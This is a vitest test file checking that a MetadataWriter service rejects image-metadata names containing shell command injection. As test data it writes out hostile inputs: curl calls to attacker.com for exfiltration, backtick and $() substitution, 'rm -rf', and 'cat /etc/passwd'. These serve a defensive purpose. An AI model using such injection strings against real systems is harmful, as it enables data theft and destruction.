import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { MetadataWriter } from '../../services/metadataWriter';
import * as fs from 'fs/promises';
import * as path from 'path';
import * as os from 'os';

describe('Command Injection Prevention', () => {
  let writer: MetadataWriter;
  let testDir: string;
  let testFile: string;

  beforeEach(async () => {
    writer = new MetadataWriter();
    testDir = await fs.mkdtemp(path.join(os.tmpdir(), 'cmd-injection-test-'));
    testFile = path.join(testDir, 'test-image.jpg');

    // Create valid JPEG with proper structure
    // JPEG format: SOI (0xFFD8) + APP0 (0xFFE0) + EOI (0xFFD9)
    const jpegData = Buffer.concat([
      Buffer.from([0xFF, 0xD8]),  // SOI (Start of Image)
      Buffer.from([0xFF, 0xE0, 0x00, 0x10]),  // APP0 marker + length
      Buffer.from('JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'),  // JFIF header
      Buffer.from([0xFF, 0xDB, 0x00, 0x43]),  // DQT marker (quantization table)
      Buffer.alloc(67, 0x10),  // Quantization table data
      Buffer.from([0xFF, 0xC0, 0x00, 0x0B, 0x08, 0x00, 0x01, 0x00, 0x01, 0x01, 0x01, 0x11, 0x00]),  // SOF0
      Buffer.from([0xFF, 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x3F, 0x00]),  // SOS marker
      Buffer.from([0xD2, 0x75, 0x3D]),  // Minimal scan data
      Buffer.from([0xFF, 0xD9])  // EOI (End of Image)
    ]);
    await fs.writeFile(testFile, jpegData);
  });

  afterEach(async () => {
    await fs.rm(testDir, { recursive: true, force: true });
  });

  it('should reject metadata with shell command injection attempt', async () => {
    const maliciousName = '"; curl attacker.com/steal; echo "';

    // Should NOT execute curl command
    await expect(
      writer.writeMetadataToFile(testFile, maliciousName, [])
    ).rejects.toThrow();
  });

  it('should reject metadata with backticks (command substitution)', async () => {
    const maliciousName = 'Image`whoami`Name';

    await expect(
      writer.writeMetadataToFile(testFile, maliciousName, [])
    ).rejects.toThrow();
  });

  it('should reject metadata with $() command substitution', async () => {
    const maliciousName = 'Image$(whoami)Name';

    await expect(
      writer.writeMetadataToFile(testFile, maliciousName, [])
    ).rejects.toThrow();
  });

  it('should reject metadata with semicolon command separator', async () => {
    const maliciousName = 'ValidName; rm -rf /tmp/test';

    await expect(
      writer.writeMetadataToFile(testFile, maliciousName, [])
    ).rejects.toThrow();
  });

  it('should reject metadata with pipe command chaining', async () => {
    const maliciousName = 'ValidName | cat /etc/passwd';

    await expect(
      writer.writeMetadataToFile(testFile, maliciousName, [])
    ).rejects.toThrow();
  });

  it('should reject metadata with ampersand background execution', async () => {
    const maliciousName = 'ValidName & curl attacker.com &';

    await expect(
      writer.writeMetadataToFile(testFile, maliciousName, [])
    ).rejects.toThrow();
  });

  it('should accept safe metadata with special but safe characters', async () => {
    const safeName = "Oven's Control-Panel (2024) [Kitchen]";
    const safeTags = ['oven', 'control-panel', 'kitchen'];

    // Should NOT throw
    await expect(
      writer.writeMetadataToFile(testFile, safeName, safeTags)
    ).resolves.not.toThrow();
  });

  it('should sanitize Unicode characters safely', async () => {
    const unicodeName = 'Image 测试 مرحبا привет';

    // Should handle Unicode without shell injection
    await expect(
      writer.writeMetadataToFile(testFile, unicodeName, [])
    ).resolves.not.toThrow();
  });
});
